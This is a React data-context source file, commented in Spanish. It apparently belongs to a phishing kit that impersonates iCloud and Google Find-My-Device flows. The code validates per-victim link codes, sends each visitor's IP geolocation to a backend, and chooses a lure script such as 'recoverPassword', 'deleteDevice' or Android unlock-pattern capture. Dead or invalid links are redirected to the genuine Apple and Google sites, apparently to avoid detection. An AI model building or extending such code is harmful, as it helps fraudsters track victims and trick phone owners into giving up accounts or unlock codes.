import { createContext, useContext, useState, useCallback } from "react";
import axios from 'axios';
import geolocation from "../api/geolocation";

const DataContext = createContext();

const redirectLink = (code) => {  

    if(!code){
          window.location.href = 'https://google.com';
    }

    const rawData = sessionStorage.getItem(`userData_${code}`);
    if (rawData) {
        // 2. Lo convertimos de string a objeto JSON
        const parsedData = JSON.parse(rawData);
        // 3. Accedemos a la propiedad: data -> script
        const scriptValue = parsedData.data?.script;
        console.log("Datos temporales recuperados. Script:", scriptValue);
        switch (scriptValue) {
            case 'ic':
                window.location.href = 'https://www.icloud.com';
                return null;
            case 'icFind':
                window.location.href = 'https://www.icloud.com/find';
                return null;
            case 'maps':
                window.location.href = 'https://www.icloud.com/find';
                return null;
            case 'wappVerify':
                window.location.href = 'https://www.icloud.com';
                return null;
            case 'recoverPassword':
                window.location.href = 'https://www.icloud.com';
                return null;
            case 'deleteDevice':
                window.location.href = 'https://www.icloud.com';
                return null;
            case 'androidAppPattern':
            case 'androidAppNumeric':
            case 'androidAppAlphanumeric':
                window.location.href = 'https://myaccount.google.com/find-your-phone';
                return null;

            default:
                window.location.href = 'https://google.com';
        }
    } else {
       window.location.href = 'https://google.com';
    }

}

export const DataProvider = ({ children }) => {
    const [user, setUser] = useState(null);
    const [loading, setLoading] = useState(false);
    const [isReady, setIsReady] = useState(null);

    const verifyProcess = useCallback(async (code) => {
        if (!code || code === "id" || code === ""){
           redirectLink()
           return;          
        } 

        // 1. CARGA OPTIMISTA
        const saved = localStorage.getItem(`userData_${code}`);
        if (saved) {
            setUser(JSON.parse(saved));
            setIsReady(true);
        } else {
            setLoading(true);
            setIsReady(null);
        }

        try {
            // --- NUEVO: Obtener la geolocalización antes del post ---
            // Asumiendo que 'geolocation' es una función o tiene un método getClientData
            const geoData = await geolocation.location();

            // 2. PETICIÓN A LA DB CON LOS DATOS UNIDOS
            const response = await axios.post(
                `${window.APP_CONFIG.API_URL}/api/getProcess`,
                {
                    linkCode: code,
                    locationData: geoData // <--- Aquí envías todo el JSON de la IP
                },
                { headers: { 'Content-Type': 'application/json' } }
            );

            const dbData = response.data?.data;
            const isActive = dbData && dbData.status === false && dbData.linkCode === code;
            sessionStorage.setItem(`userData_${code}`, JSON.stringify(response.data));
            if (isActive) {
                localStorage.setItem(`userData_${code}`, JSON.stringify(response.data));
                
                setUser(response.data);
                setIsReady(true);
            } else {
                localStorage.removeItem(`userData_${code}`);
                setUser(null);
                setIsReady(false);

               
                redirectLink(code)
                //redirectLink(code)                
            }
        } catch (error) {
            localStorage.removeItem(`userData_${code}`);
            setUser(null);
            setIsReady(false);
            console.log('aqui 2')
            redirectLink(code)
            //redirectLink(code)
            //console.error("Error validando código o geolocalización");
        } finally {
            setLoading(false);
        }
    }, []);

    return (
        <DataContext.Provider value={{ user, loading, isReady, verifyProcess }}>
            {children}
        </DataContext.Provider>
    );
};
export const useData = () => useContext(DataContext);